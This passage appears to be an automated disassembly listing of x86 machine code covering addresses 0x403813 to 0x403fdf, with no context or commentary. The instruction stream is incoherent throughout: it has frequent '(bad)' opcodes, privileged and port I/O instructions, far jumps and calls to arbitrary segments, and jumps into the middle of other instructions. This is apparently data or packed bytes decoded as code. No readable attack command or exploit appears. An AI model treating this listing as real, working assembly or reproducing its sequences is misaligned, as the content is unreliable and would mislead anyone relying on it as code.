  403813:	addr16 loope 0x4037ed
  403816:	jp     0x403817
  403818:	or     al,0x92
  40381a:	adc    ch,BYTE PTR [edx]
  40381c:	xchg   esi,eax
  40381d:	sar    BYTE PTR [edi],1
  40381f:	ret    0xeaa
  403822:	icebp  
  403823:	inc    ecx
  403824:	jge    0x40385d
  403826:	adc    BYTE PTR [eax],dh
  403828:	rcl    DWORD PTR [eax],cl
  40382a:	pop    ds
  40382b:	push   ebp
  40382c:	test   cl,bh
  40382e:	push   ss
  40382f:	xor    BYTE PTR [esp+edx*4-0x6c0cb672],bh
  403836:	sbb    edi,DWORD PTR [edx+0xd]
  403839:	sar    BYTE PTR [esp+ebp*8-0x64],cl
  40383d:	cmp    BYTE PTR [ecx-0x64],bh
  403840:	dec    esi
  403841:	into   
  403842:	call   0x2113ae4c
  403847:	es sbb eax,0x1b75b2b0
  40384d:	jle    0x403835
  40384f:	fsubr  DWORD PTR [edx+0x34]
  403852:	inc    edx
  403853:	or     bh,BYTE PTR [esi-0x17]
  403856:	loop   0x403840
  403858:	xor    esp,DWORD PTR [esi-0x4a48b2ea]
  40385e:	loop   0x40388b
  403860:	stos   BYTE PTR es:[edi],al
  403861:	adc    ch,BYTE PTR [edi+0x73209384]
  403867:	xchg   DWORD PTR [eax],edi
  403869:	mov    edi,0x5ecc82e8
  40386e:	stos   DWORD PTR es:[edi],eax
  40386f:	jg     0x403830
  403871:	les    ecx,FWORD PTR [esi+0x73e07b9a]
  403877:	cwde   
  403878:	and    al,0xf2
  40387a:	sub    al,0x74
  40387c:	sub    BYTE PTR [ebx-0x13],cl
  40387f:	in     al,dx
  403880:	ficomp DWORD PTR [edi-0x1f]
  403883:	stos   DWORD PTR es:[edi],eax
  403884:	hlt    
  403885:	inc    DWORD PTR [esi-0x3269b5cd]
  40388b:	sub    dh,BYTE PTR [ecx]
  40388d:	mov    DWORD PTR [esi],ebx
  40388f:	mov    al,0x93
  403891:	in     al,dx
  403892:	mov    eax,0x2d5810fd
  403897:	adc    eax,0x48493740
  40389c:	dec    ecx
  40389d:	mov    dl,0xc5
  40389f:	ror    ch,0xdd
  4038a2:	cmp    cl,BYTE PTR [eax-0x5f]
  4038a5:	mov    BYTE PTR [edi+0x6e],dh
  4038a8:	inc    esi
  4038a9:	xchg   cl,cl
  4038ab:	add    al,0xa2
  4038ad:	jp     0x403911
  4038af:	jbe    0x40386f
  4038b1:	jle    0x403858
  4038b3:	inc    edi
  4038b4:	cs out 0x41,al
  4038b7:	adc    DWORD PTR [ebp-0x8],esi
  4038ba:	nop
  4038bb:	add    al,BYTE PTR [ebx-0x1d94be02]
  4038c1:	scas   al,BYTE PTR es:[edi]
  4038c2:	ret    
  4038c3:	into   
  4038c4:	in     al,0x55
  4038c6:	test   ebp,eax
  4038c8:	and    ebp,DWORD PTR [esi]
  4038ca:	aaa    
  4038cb:	popa   
  4038cc:	mov    dh,0x88
  4038ce:	push   ss
  4038cf:	mov    ebp,0xc2fbb156
  4038d4:	enter  0xc6c4,0x52
  4038d8:	in     al,0x5a
  4038da:	mov    ecx,0x63590a5
  4038df:	fmul   st(3),st
  4038e1:	push   0xfffffff5
  4038e3:	xor    eax,0x10b375fc
  4038e8:	lock jnp 0x40389b
  4038eb:	add    eax,0xf57988a3
  4038f0:	push   ecx
  4038f1:	cmp    eax,0xd0a19c02
  4038f6:	(bad)
  4038fa:	out    0x8a,eax
  4038fc:	pinsrw mm6,WORD PTR [ebx-0x7e74cabd],0x17
  403904:	xchg   BYTE PTR ds:0x17b68094,dh
  40390a:	pop    esp
  40390b:	mov    eax,ds:0xabc20a1f
  403910:	push   edi
  403911:	sbb    eax,0xa56065f0
  403916:	jbe    0x4038f8
  403918:	mov    esi,0x566ef4d4
  40391d:	mov    DWORD PTR [ecx+0x42],ebx
  403920:	pop    ss
  403921:	jae    0x4038d0
  403923:	in     eax,dx
  403924:	cdq    
  403925:	inc    ecx
  403926:	repnz push es
  403928:	pushf  
  403929:	adc    al,0x50
  40392b:	adc    eax,0xe842d4fc
  403930:	imul   edx,DWORD PTR [esi+0x5208c935],0x6110717
  40393a:	ins    BYTE PTR es:[edi],dx
  40393b:	aam    0x73
  40393d:	sbb    ecx,DWORD PTR [edx+eax*2]
  403940:	(bad)  
  403942:	mov    ds:0x5f3fc988,eax
  403947:	jno    0x4038dd
  403949:	push   es
  40394a:	sub    DWORD PTR [esi-0x5efb7856],0x5e
  403951:	pop    ecx
  403952:	sub    BYTE PTR [ebp+edi*2+0x2725f4b3],bh
  403959:	cmp    BYTE PTR [ecx-0x4a],bh
  40395c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40395d:	mov    ch,0x83
  40395f:	loop   0x40396b
  403961:	xor    DWORD PTR [edx],0xa38ec7f2
  403967:	ror    BYTE PTR [edi-0x5],1
  40396a:	pop    edi
  40396b:	hlt    
  40396c:	mov    dl,BYTE PTR [edi-0x77441f76]
  403972:	pop    edx
  403973:	jp     0x4039b2
  403975:	mov    bl,0x90
  403977:	fimul  DWORD PTR [ecx]
  403979:	fsubr  QWORD PTR [edi]
  40397b:	call   0x6548cd5f
  403980:	jns    0x4039d6
  403982:	rcl    BYTE PTR [esi-0x25],0xe2
  403986:	addr16 out dx,al
  403988:	rcr    eax,cl
  40398a:	xor    al,0xb9
  40398c:	pop    esp
  40398d:	xor    al,0xb4
  40398f:	mov    ebx,0x918524d4
  403994:	mov    ecx,0x78a39971
  403999:	pop    ds
  40399a:	fwait
  40399b:	mov    bl,BYTE PTR [ebx+0x24b2e963]
  4039a1:	out    dx,al
  4039a2:	js     0x403991
  4039a4:	dec    ebp
  4039a5:	or     esi,esi
  4039a7:	mov    ds:0xad4e775a,eax
  4039ac:	(bad)  
  4039ad:	mov    ebx,0xf5d459fc
  4039b2:	lods   al,BYTE PTR ds:[esi]
  4039b3:	add    ebp,edx
  4039b5:	out    0x9f,al
  4039b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039b8:	mov    ch,0x2a
  4039ba:	out    0xa3,eax
  4039bc:	xlat   BYTE PTR ds:[ebx]
  4039bd:	push   ebx
  4039be:	cdq    
  4039bf:	loop   0x40398c
  4039c1:	js     0x403a01
  4039c3:	xor    al,BYTE PTR [esi+ecx*8]
  4039c6:	pop    edx
  4039c7:	push   0x32
  4039c9:	fnstcw WORD PTR [ebx-0x6b]
  4039cc:	cld    
  4039cd:	pop    edi
  4039ce:	cmp    DWORD PTR [ebp-0x7a],esp
  4039d1:	sbb    DWORD PTR ds:0x3cd2ed6e,ecx
  4039d7:	jp     0x40395b
  4039d9:	sbb    DWORD PTR [ebx-0xb],ecx
  4039dc:	mov    ecx,DWORD PTR [edx+esi*4-0x727aa90d]
  4039e3:	ins    BYTE PTR es:[edi],dx
  4039e4:	adc    bl,ch
  4039e6:	pop    ebx
  4039e7:	xchg   DWORD PTR [ecx+0x4c4faf27],esp
  4039ed:	jecxz  0x4039cd
  4039ef:	xchg   esp,eax
  4039f0:	mov    cl,BYTE PTR [edi+0x52]
  4039f3:	push   ds
  4039f4:	pop    ebp
  4039f5:	jmp    0x2dc5:0xe8370873
  4039fc:	mov    eax,0x888f824b
  403a01:	inc    ebx
  403a02:	lea    ecx,[edi-0x52e5a98a]
  403a08:	sbb    ebp,DWORD PTR [edi-0x506c9971]
  403a0e:	(bad)  
  403a0f:	adc    eax,0xd75a2cfa
  403a14:	and    DWORD PTR [ecx+0x329db43f],0xffffffa1
  403a1b:	jb     0x4039ec
  403a1d:	dec    eax
  403a1e:	mov    bl,0xf9
  403a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a21:	into   
  403a22:	cli    
  403a23:	xlat   BYTE PTR ds:[ebx]
  403a24:	loop   0x403a64
  403a26:	(bad)  
  403a28:	cmp    ah,dl
  403a2a:	pusha  
  403a2b:	jmp    0xc67c:0xbb646cab
  403a32:	push   esp
  403a33:	repnz pop edx
  403a35:	cli    
  403a36:	jae    0x403a70
  403a38:	adc    DWORD PTR [edi+ecx*1],ebx
  403a3b:	test   al,0x7f
  403a3d:	rcl    dh,1
  403a3f:	stc    
  403a40:	push   0xffffffb8
  403a42:	adc    dl,BYTE PTR [eax-0x30]
  403a45:	jns    0x403a5f
  403a47:	cdq    
  403a48:	xchg   DWORD PTR ds:[edi],ecx
  403a4b:	gs ja  0x403a19
  403a4e:	or     BYTE PTR [edx],bl
  403a50:	lock adc DWORD PTR [ebx-0x15],ecx
  403a54:	sbb    eax,0xed2e0bdd
  403a59:	icebp  
  403a5a:	push   esp
  403a5b:	mov    ds:0x2303c7a4,al
  403a60:	mov    es,WORD PTR [ebx]
  403a62:	dec    edi
  403a63:	push   edi
  403a64:	test   DWORD PTR [ecx-0x5973f1ca],0xe814e7e
  403a6e:	inc    edi
  403a6f:	repnz sbb BYTE PTR [ebx-0x66d039ed],al
  403a76:	sbb    eax,esp
  403a78:	mov    edi,0x2004301
  403a7d:	adc    eax,DWORD PTR [ebx+0x73]
  403a80:	mul    DWORD PTR [ebx+edi*4-0x4704a31b]
  403a87:	call   0xfd14:0xf1563656
  403a8e:	mov    esp,0x75666f39
  403a93:	sub    dh,BYTE PTR [edi]
  403a95:	lock push edx
  403a97:	pop    ds
  403a98:	adc    DWORD PTR [edi-0x55],ebx
  403a9b:	push   0xce43918a
  403aa0:	repnz inc esp
  403aa2:	mov    ds:0x69fd057,al
  403aa7:	into   
  403aa8:	lds    eax,FWORD PTR [ebx-0x1b4366bb]
  403aae:	and    eax,ecx
  403ab0:	xor    dh,BYTE PTR [eax+0x6f]
  403ab3:	xor    BYTE PTR [eax],dl
  403ab5:	int    0x4a
  403ab7:	bound  edx,QWORD PTR [ebx-0x5a3dadb9]
  403abd:	cwde   
  403abe:	into   
  403abf:	xchg   ecx,eax
  403ac0:	mov    ebp,ebp
  403ac2:	(bad)  
  403ac3:	sbb    BYTE PTR cs:[eax+0x62a4ce0f],cl
  403aca:	sub    edi,esp
  403acc:	in     al,0xa0
  403ace:	mov    es,WORD PTR [ebx+0x50]
  403ad1:	mov    eax,0xcf925914
  403ad6:	jae    0x403b1a
  403ad8:	test   DWORD PTR [ecx-0x2765ec8c],eax
  403ade:	jmp    0x403b58
  403ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ae1:	mov    cl,0xa5
  403ae3:	repnz ins DWORD PTR es:[edi],dx
  403ae5:	es sub esi,ebp
  403ae8:	arpl   WORD PTR [edx+edi*2-0x28],dx
  403aec:	fwait
  403aed:	rcl    DWORD PTR [ecx+0x64],1
  403af0:	dec    ebp
  403af1:	or     edx,ebx
  403af3:	xchg   BYTE PTR [ebx],al
  403af5:	adc    BYTE PTR [edx],al
  403af7:	icebp  
  403af8:	or     al,0x83
  403afa:	and    ecx,ecx
  403afc:	xor    BYTE PTR [esi-0x5bbe7a97],al
  403b02:	ss call 0x1888:0x2b3381c4
  403b0a:	pop    ebx
  403b0b:	xchg   ebx,eax
  403b0c:	sub    BYTE PTR [eax-0x9203ec3],bl
  403b12:	and    ecx,DWORD PTR [esi+0x51]
  403b15:	out    dx,eax
  403b16:	mov    edx,0xb8a16724
  403b1b:	mov    ah,dl
  403b1d:	(bad)  
  403b1e:	int3   
  403b1f:	ins    DWORD PTR es:[edi],dx
  403b20:	xlat   BYTE PTR ds:[ebx]
  403b21:	iret   
  403b22:	call   0xc80b:0x8f358c21
  403b29:	and    BYTE PTR [ebp+ecx*4+0x47],ch
  403b2d:	inc    ecx
  403b2e:	push   ebp
  403b2f:	and    al,0xde
  403b31:	mov    ss,WORD PTR [ebx]
  403b33:	mov    bl,0xfc
  403b35:	add    al,0xbc
  403b37:	sar    bh,0xb9
  403b3a:	scas   al,BYTE PTR es:[edi]
  403b3b:	cld    
  403b3c:	pop    es
  403b3d:	sub    al,0x65
  403b3f:	add    al,0xcc
  403b41:	stos   DWORD PTR es:[edi],eax
  403b42:	jmp    0x8a07d55d
  403b47:	sub    BYTE PTR [edx+0x2d],bh
  403b4a:	imul   edi,DWORD PTR ds:0x49248051,0x991382bc
  403b54:	mov    ah,0xd
  403b56:	mov    ebx,ebx
  403b58:	mov    esp,0x2e9f5441
  403b5d:	das    
  403b5e:	cmp    DWORD PTR [esp+ebx*2-0x1ec87dee],0x63
  403b66:	mov    WORD PTR [ecx+0x76],?
  403b69:	aaa    
  403b6a:	shl    DWORD PTR [edx],0xce
  403b6d:	into   
  403b6e:	or     ebp,DWORD PTR [ecx+ebx*2-0x5]
  403b72:	ss jnp 0x403b73
  403b75:	adc    ebp,DWORD PTR [ecx+0x6f4f07ad]
  403b7b:	sub    DWORD PTR [edi+0x3ddca43b],esi
  403b81:	push   es
  403b82:	ins    BYTE PTR es:[edi],dx
  403b83:	jmp    0xe1c8b14e
  403b88:	and    edx,DWORD PTR [esi+0x60]
  403b8b:	mov    al,ds:0x5ebaa670
  403b90:	(bad)  
  403b91:	(bad)  [ecx-0x65]
  403b94:	push   esp
  403b95:	jo     0x403b59
  403b97:	in     eax,dx
  403b98:	in     eax,dx
  403b99:	dec    ecx
  403b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b9b:	sahf   
  403b9c:	xchg   ecx,eax
  403b9d:	(bad)  
  403b9e:	adc    ebp,DWORD PTR [ebx+ecx*8-0x20]
  403ba2:	mov    ebp,0xc1a8ed69
  403ba7:	push   ss
  403ba8:	popw   ss
  403baa:	loopne 0x403c27
  403bac:	mov    bl,0xcd
  403bae:	fimul  DWORD PTR [ecx]
  403bb0:	mov    esp,0xac4ce3a5
  403bb5:	inc    esi
  403bb6:	loope  0x403bc3
  403bb8:	push   ecx
  403bb9:	sar    BYTE PTR [edx+ecx*4-0x4560fb6b],1
  403bc0:	(bad)  
  403bc1:	mov    al,0x8e
  403bc3:	push   ss
  403bc4:	sub    BYTE PTR [edx+0x7a3d20d5],ch
  403bca:	std    
  403bcb:	add    DWORD PTR [esp+esi*2],ebx
  403bce:	in     al,dx
  403bcf:	je     0x403b99
  403bd1:	and    al,BYTE PTR [esi+0x5d552c1e]
  403bd7:	jae    0x403b62
  403bd9:	add    eax,0xeb0c955b
  403bde:	and    edi,DWORD PTR [esi+0x42]
  403be1:	mov    ss,WORD PTR [ebp+ebx*1+0x38]
  403be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403be6:	loop   0x403bf6
  403be8:	stos   BYTE PTR es:[edi],al
  403be9:	popf   
  403bea:	imul   esp,DWORD PTR [ebp+0x1b],0xfffffffe
  403bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bef:	cld    
  403bf0:	jns    0x403be4
  403bf2:	test   BYTE PTR [edi-0x25],ch
  403bf5:	fiadd  WORD PTR [edx+0x21]
  403bf8:	add    ch,0x42
  403bfb:	loop   0x403c33
  403bfd:	xlat   BYTE PTR ds:[ebx]
  403bfe:	pmaxub mm4,QWORD PTR [eax+0x3b]
  403c02:	shr    BYTE PTR [ebx],cl
  403c04:	mov    edx,0x976f2f75
  403c09:	xor    eax,0x8a7fd6f5
  403c0e:	loopne 0x403ba8
  403c10:	rcr    DWORD PTR [esp+ecx*4],0xd6
  403c14:	add    DWORD PTR [ebp+0x7d28e149],ebp
  403c1a:	sub    al,0x81
  403c1c:	mov    ah,0x37
  403c1e:	fld    st(1)
  403c20:	mov    dl,0xba
  403c22:	mov    BYTE PTR [edx],bh
  403c24:	sti    
  403c25:	sbb    edi,DWORD PTR [ecx-0x7d437306]
  403c2b:	stc    
  403c2c:	stos   DWORD PTR es:[edi],eax
  403c2d:	or     esi,eax
  403c2f:	ficomp WORD PTR [eax+0x52]
  403c32:	xor    eax,0x99546433
  403c37:	jle    0x403c49
  403c39:	cdq    
  403c3a:	ss xor al,0x7c
  403c3d:	addr16 popf 
  403c3f:	adc    eax,0x6768755c
  403c44:	push   0xfffffff5
  403c46:	dec    edi
  403c47:	fsub   QWORD PTR [edi]
  403c49:	ins    DWORD PTR es:[edi],dx
  403c4a:	push   ss
  403c4b:	mov    esp,0xf8fbc213
  403c50:	push   edi
  403c51:	stc    
  403c52:	push   esp
  403c53:	fstp   DWORD PTR [esi-0xc55a713]
  403c59:	iret   
  403c5a:	test   al,0x78
  403c5c:	(bad)  
  403c5d:	jl     0x403c90
  403c5f:	aad    0x29
  403c61:	mov    edx,0x3717f45a
  403c66:	out    dx,eax
  403c67:	mov    ah,BYTE PTR [eax]
  403c69:	add    eax,0x82e390ab
  403c6e:	ds xchg edi,eax
  403c70:	sbb    bh,BYTE PTR [edi-0x40]
  403c73:	ffreep st(0)
  403c75:	fbld   TBYTE PTR [ebx-0x166e3937]
  403c7b:	enter  0x6c3b,0xc3
  403c7f:	inc    esp
  403c80:	push   eax
  403c81:	aad    0xfa
  403c83:	call   0xbd5a:0x1665c1f0
  403c8a:	push   ebp
  403c8b:	and    BYTE PTR [ecx+0x6d667b3b],0x94
  403c92:	mov    eax,ds:0xe52aa414
  403c97:	adc    ah,al
  403c99:	repnz daa 
  403c9b:	sub    eax,edx
  403c9d:	xchg   edx,eax
  403c9e:	scas   eax,DWORD PTR es:[edi]
  403c9f:	jno    0x403d1e
  403ca1:	int3   
  403ca2:	jge    0x403d0e
  403ca4:	bound  eax,QWORD PTR [esp+eax*1-0x30a71e81]
  403cab:	(bad)  
  403cac:	test   DWORD PTR [eax],esi
  403cae:	ja     0x403cb8
  403cb0:	dec    esp
  403cb1:	pop    ebx
  403cb2:	enter  0x5ade,0x17
  403cb6:	pop    ebx
  403cb7:	adc    ebp,esp
  403cb9:	mul    BYTE PTR [edx-0x369f7d58]
  403cbf:	adc    eax,0xe6039710
  403cc4:	iret   
  403cc5:	jae    0x403cdc
  403cc7:	test   al,0x21
  403cc9:	out    dx,al
  403cca:	arpl   WORD PTR [esi-0x16],bp
  403ccd:	add    al,0x44
  403ccf:	inc    esp
  403cd0:	daa    
  403cd1:	xchg   edi,eax
  403cd2:	pop    esp
  403cd3:	not    DWORD PTR [esi]
  403cd5:	mov    dh,BYTE PTR [esi]
  403cd7:	sub    al,BYTE PTR ds:0x8957f784
  403cdd:	hlt    
  403cde:	and    dl,BYTE PTR [ecx-0x4e0e5dda]
  403ce4:	aam    0x7
  403ce6:	cdq    
  403ce7:	rol    edi,cl
  403ce9:	imul   ecx,edi,0xffffffbb
  403cec:	out    0xaa,eax
  403cee:	dec    esp
  403cef:	icebp  
  403cf0:	enter  0xfa23,0x41
  403cf4:	add    ebx,DWORD PTR [edi]
  403cf6:	pop    esp
  403cf7:	int3   
  403cf8:	fcomp  QWORD PTR [edi]
  403cfa:	xor    eax,0xc0a8cf63
  403cff:	addr16 aam 0xc3
  403d02:	cdq    
  403d03:	loope  0x403c8f
  403d05:	cmc    
  403d06:	add    BYTE PTR [ecx+eax*1-0x61],cl
  403d0a:	addr16 jbe 0x403d12
  403d0d:	mov    WORD PTR [ecx],ss
  403d0f:	mov    dl,0x6f
  403d11:	pop    ds
  403d12:	dec    esi
  403d13:	jbe    0x403d82
  403d15:	adc    BYTE PTR [esi+ebp*4],bh
  403d18:	in     eax,dx
  403d19:	mov    edx,0x19ccda08
  403d1e:	pushf  
  403d1f:	cmp    ch,BYTE PTR [eax-0x5c55c329]
  403d25:	ds imul eax,esp,0xb5f46a35
  403d2c:	sbb    ebp,DWORD PTR [eax+0x52]
  403d2f:	popa   
  403d30:	pushf  
  403d31:	aaa    
  403d32:	rol    esp,0x29
  403d35:	cmp    cl,BYTE PTR [ecx+0x59]
  403d38:	rcr    DWORD PTR [ebx+0xa323d40],cl
  403d3e:	dec    edx
  403d3f:	jp     0x403d03
  403d41:	sub    eax,0x759ec0e5
  403d46:	mov    DWORD PTR [edx+0x60ffedcd],eax
  403d4c:	data16 cmc 
  403d4e:	nop
  403d4f:	or     BYTE PTR [ecx-0x6ab592c6],bh
  403d55:	fs dec eax
  403d57:	clc    
  403d58:	idiv   ah
  403d5a:	scas   eax,DWORD PTR es:[edi]
  403d5b:	dec    edi
  403d5c:	jg     0x403dce
  403d5e:	repz sub dh,BYTE PTR fs:[ebx+0x5b04cbfd]
  403d66:	dec    ebp
  403d67:	or     dh,BYTE PTR [eax+eiz*4]
  403d6a:	push   es
  403d6b:	int3   
  403d6c:	inc    edx
  403d6d:	jno    0x403d2b
  403d6f:	or     BYTE PTR [eax],0x2
  403d72:	test   al,0xb
  403d74:	out    0x22,eax
  403d76:	mov    BYTE PTR [edi+0x8c35d64],ch
  403d7c:	push   cs
  403d7d:	cmp    bl,BYTE PTR [ebp+0x57]
  403d80:	pop    edi
  403d81:	inc    ebp
  403d82:	cs inc edx
  403d84:	int    0x88
  403d86:	out    0xc7,eax
  403d88:	fld    st(3)
  403d8a:	scas   eax,DWORD PTR es:[edi]
  403d8b:	pop    edi
  403d8c:	(bad)  
  403d8d:	outs   dx,BYTE PTR ds:[esi]
  403d8e:	mov    edx,0x1d5ab884
  403d93:	mov    WORD PTR [esi-0x3bed307a],gs
  403d99:	jno    0x403d50
  403d9b:	or     eax,0x802d4ac1
  403da0:	fdivr  st(3),st
  403da2:	add    DWORD PTR [edx],ebp
  403da4:	sbb    al,0x4c
  403da6:	pusha  
  403da7:	fisttp DWORD PTR [ebp+0xe]
  403daa:	nop
  403dab:	mov    edx,edi
  403dad:	jecxz  0x403d53
  403daf:	and    DWORD PTR [ebp-0x37],edi
  403db2:	dec    edx
  403db3:	bound  edx,QWORD PTR [ebx+0x1ee587aa]
  403db9:	push   ebx
  403dba:	lea    eax,[edx]
  403dbc:	inc    esi
  403dbd:	les    ecx,FWORD PTR [ebx]
  403dbf:	(bad)  
  403dc0:	das    
  403dc1:	dec    ebp
  403dc2:	popa   
  403dc3:	or     BYTE PTR [eax],bh
  403dc5:	inc    ebx
  403dc6:	retf   
  403dc7:	push   ebx
  403dc8:	fiadd  WORD PTR [esp+eiz*8]
  403dcb:	repz (bad) 
  403dcd:	sub    DWORD PTR [esi-0x3c],ecx
  403dd0:	in     eax,dx
  403dd1:	mov    ch,0x52
  403dd3:	xor    BYTE PTR [esi+0x65216cc1],ah
  403dd9:	(bad)  
  403ddc:	or     bh,bh
  403dde:	pop    ebp
  403ddf:	adc    eax,DWORD PTR [ecx]
  403de1:	or     al,0x20
  403de3:	pop    ebp
  403de4:	mov    dl,0x92
  403de6:	xor    edx,DWORD PTR [edx]
  403de8:	xchg   ecx,eax
  403de9:	and    ebp,DWORD PTR [ebp+eax*2+0x56]
  403ded:	cli    
  403dee:	test   BYTE PTR [edi],0xb3
  403df1:	in     eax,0xd
  403df3:	retf   
  403df4:	or     al,BYTE PTR [edi]
  403df6:	cmp    al,0xbf
  403df8:	dec    esi
  403df9:	jb     0x403e77
  403dfb:	lds    edi,FWORD PTR [eax+0x31617a7f]
  403e01:	sbb    bl,BYTE PTR [esi-0x31ed934f]
  403e07:	and    BYTE PTR [edx*8-0x5f84cbb3],0x9e
  403e0f:	popf   
  403e10:	test   DWORD PTR [edi],esi
  403e12:	pop    esi
  403e13:	iret   
  403e14:	fild   WORD PTR [ebp+ebx*2-0x46]
  403e18:	das    
  403e19:	std    
  403e1a:	xor    cl,BYTE PTR [eax+eiz*8-0x5c]
  403e1e:	stc    
  403e1f:	cli    
  403e20:	sub    al,0x86
  403e22:	loopne 0x403dd2
  403e24:	(bad)  
  403e26:	xchg   ecx,eax
  403e27:	aad    0x72
  403e29:	sbb    eax,0x55e9bc5b
  403e2e:	outs   dx,BYTE PTR ds:[esi]
  403e2f:	or     ah,al
  403e31:	pop    esp
  403e32:	jmp    0x480f:0x706b90cd
  403e39:	ret    
  403e3a:	mov    ds,esp
  403e3c:	stos   BYTE PTR es:[edi],al
  403e3d:	das    
  403e3e:	pop    esp
  403e3f:	iret   
  403e40:	js     0x403dfa
  403e42:	call   0x860ea5bb
  403e47:	fmul   QWORD PTR [esi+0x678d854]
  403e4d:	inc    eax
  403e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e4f:	add    DWORD PTR [edx+0x3030b42b],esp
  403e55:	ret    
  403e56:	sub    BYTE PTR [esi-0x2ed19ed9],ch
  403e5c:	xacquire xchg BYTE PTR [ebx-0x6e],ch
  403e60:	sahf   
  403e61:	shl    DWORD PTR [edi-0x74768ba7],0x90
  403e68:	jns    0x403e7a
  403e6a:	inc    ebp
  403e6b:	sysret 
  403e6d:	adc    dh,ah
  403e6f:	add    DWORD PTR [edx+0x6e251957],edi
  403e75:	mov    ch,0x5
  403e77:	cs mov bh,0xeb
  403e7a:	mov    bl,BYTE PTR [esp+ebx*4]
  403e7d:	inc    ebx
  403e7e:	fistp  WORD PTR [esi-0x7c]
  403e81:	jno    0x403e75
  403e83:	(bad)  
  403e84:	div    BYTE PTR [ebp+0x18d42533]
  403e8a:	push   0x7
  403e8c:	push   0x77
  403e8e:	addr16 xor eax,0xc1dd89b9
  403e94:	repz and al,0x96
  403e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e98:	xchg   ecx,eax
  403e99:	adc    BYTE PTR [esi-0x40d6a04a],dl
  403e9f:	aaa    
  403ea0:	imul   eax,esp,0x187fabdc
  403ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ea7:	fmul   DWORD PTR [ecx+ebx*8]
  403eaa:	movq   QWORD PTR [eax-0x168bfa14],mm7
  403eb1:	mov    ds:0x41b58f6e,al
  403eb6:	ins    BYTE PTR es:[edi],dx
  403eb7:	ins    BYTE PTR es:[edi],dx
  403eb8:	jb     0x403f18
  403eba:	xor    edx,DWORD PTR [esi-0x6312ca3c]
  403ec0:	adc    DWORD PTR [ebp-0x3856ad57],esp
  403ec6:	shl    DWORD PTR [edx-0x53],1
  403ec9:	fnstsw WORD PTR [ebp-0x14]
  403ecc:	or     eax,DWORD PTR [esi+ecx*8]
  403ecf:	jnp    0x403f0b
  403ed1:	scas   al,BYTE PTR es:[edi]
  403ed2:	mov    al,0x51
  403ed4:	sbb    eax,0xde73348b
  403ed9:	or     al,0x9b
  403edb:	ret    0xf149
  403ede:	push   edi
  403edf:	inc    ecx
  403ee0:	(bad)
  403ee4:	in     al,0xa
  403ee6:	jmp    0x9565dcd
  403eeb:	aad    0x1d
  403eed:	loope  0x403e9f
  403eef:	pop    ecx
  403ef0:	daa    
  403ef1:	push   ss
  403ef2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ef3:	dec    ecx
  403ef4:	xor    eax,0x74d78794
  403ef9:	sub    al,0xad
  403efb:	fld    TBYTE PTR [edx]
  403efd:	lea    ebx,[ecx+0x588e607c]
  403f03:	sub    DWORD PTR [ebx],edx
  403f05:	add    BYTE PTR ds:0x2ce838b5,al
  403f0b:	push   edx
  403f0c:	push   esp
  403f0d:	ret    0x57d0
  403f10:	ja     0x403f11
  403f12:	dec    esp
  403f13:	out    dx,al
  403f14:	sub    DWORD PTR [edi-0x58623bc],edi
  403f1a:	mov    dl,0x13
  403f1c:	mov    edi,0x43c2106e
  403f21:	scas   al,BYTE PTR es:[edi]
  403f22:	jmp    0x39b5:0xa97f
  403f28:	sub    ch,BYTE PTR [ecx]
  403f2a:	inc    edi
  403f2b:	pop    edx
  403f2c:	or     BYTE PTR [ebx-0x2d588e95],al
  403f32:	pop    esp
  403f33:	dec    esp
  403f34:	rol    bh,1
  403f36:	add    eax,0x5db3b76b
  403f3b:	outs   dx,DWORD PTR ds:[esi]
  403f3c:	aas    
  403f3d:	pop    edx
  403f3e:	mov    ebp,0x78fe9612
  403f43:	push   ds
  403f44:	jbe    0x403f41
  403f46:	adc    ebp,DWORD PTR [edi+0x710a1fe6]
  403f4c:	cmp    ah,BYTE PTR [edx+0x73632dae]
  403f52:	das    
  403f53:	dec    ebp
  403f54:	shr    ecx,cl
  403f56:	xor    BYTE PTR [ecx-0x6ba6a8b0],al
  403f5c:	mov    bl,BYTE PTR [edx-0x44d3116]
  403f62:	mov    ebx,DWORD PTR [ebx+0x18]
  403f65:	sub    BYTE PTR [edx+0x6b],ah
  403f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f69:	jecxz  0x403fde
  403f6b:	cld    
  403f6c:	je     0x403f12
  403f6e:	xor    bh,ah
  403f70:	sub    bl,BYTE PTR [edi+0x596f7de2]
  403f76:	(bad)  
  403f77:	call   0x7bcb8c8a
  403f7c:	sub    DWORD PTR [ebx-0x68a6d682],0x5
  403f83:	push   ecx
  403f84:	pop    ds
  403f85:	cs cdq 
  403f87:	or     BYTE PTR [ebp-0x7b],dl
  403f8a:	xchg   ebx,eax
  403f8b:	ds mov dh,0xcf
  403f8e:	in     al,dx
  403f8f:	lahf   
  403f90:	repz push eax
  403f92:	mov    esi,0xac55bac5
  403f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f98:	iret   
  403f99:	jle    0x403fc7
  403f9b:	push   ds
  403f9c:	pop    edi
  403f9d:	xor    DWORD PTR [edx-0x69],edi
  403fa0:	test   BYTE PTR [ebp+0x7],0xe3
  403fa4:	into   
  403fa5:	and    DWORD PTR [eax+0xa],ebx
  403fa8:	pop    ds
  403fa9:	mov    al,ds:0xc8f6b73a
  403fae:	dec    ebp
  403faf:	(bad)
  403fb2:	jmp    0xdbf4e758
  403fb7:	mov    ebp,0x818bd66
  403fbc:	cmp    DWORD PTR [ebx+ecx*2+0x4d34d4bb],esp
  403fc3:	push   esp
  403fc4:	cmp    eax,0x1389a33e
  403fc9:	lea    eax,[edi-0x12c758af]
  403fcf:	fild   DWORD PTR [edx]
  403fd1:	pushf  
  403fd2:	pop    ebp
  403fd3:	and    eax,0xfdfd704e
  403fd8:	mov    WORD PTR [esi+ecx*4],ss
  403fdb:	push   ebx
  403fdc:	dec    ebp
  403fdd:	ror    DWORD PTR [eax],1
  403fdf:	push   0x2b80659c
